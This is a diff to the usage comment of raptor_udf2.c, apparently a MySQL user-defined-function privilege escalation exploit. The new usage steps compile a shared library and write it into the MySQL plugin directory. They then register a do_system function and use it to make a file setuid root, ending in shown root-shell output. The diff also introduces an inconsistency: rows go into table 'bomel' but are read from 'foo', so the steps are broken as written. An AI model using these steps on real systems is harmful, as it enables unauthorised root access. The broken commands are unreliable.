@@ -15,28 +15,17 @@
  * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
  * details, please refer to:
  *
- * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
- * http://www.wisec.it/vulns.php?page=4
- * http://www.wisec.it/vulns.php?page=5
- * http://www.wisec.it/vulns.php?page=6
- *
- * "UDFs should have at least one symbol defined in addition to the xxx symbol 
- * that corresponds to the main xxx() function. These auxiliary symbols 
- * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
- * xxx_add() functions". -- User Defined Functions Security Precautions 
- *
  * Usage:
  * $ id
- * uid=500(raptor) gid=500(raptor) groups=500(raptor)
  * $ gcc -g -c raptor_udf2.c
- * $ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
  * $ mysql -u root -p
  * Enter password:
  * [...]
  * mysql> use mysql;
- * mysql> create table foo(line blob);
- * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
- * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+ * mysql> create table bomel(line blob);
+ * mysql> insert into bomel values(load_file('/home/raptor/raptor_udf2.so'));
+ * mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
  * mysql> create function do_system returns integer soname 'raptor_udf2.so';
  * mysql> select * from mysql.func;
  * +-----------+-----+----------------+----------+
@@ -44,11 +33,11 @@
  * +-----------+-----+----------------+----------+
  * | do_system |   2 | raptor_udf2.so | function |
  * +-----------+-----+----------------+----------+
- * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
- * mysql> \! sh
- * sh-2.05b$ cat /tmp/out
- * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
- * [...]
+ * mysql> select do_system('chown root:root /home/raptor/bomel; chmod 4777 /home/raptor/bomel');  
+ * mysql> quit
+ * sh-2.05b$ /home/raptor/./bomel
+ * root# id
+ * uid=0(root) gid=0(root) groups=0(root)
  */
 
 #include <stdio.h>
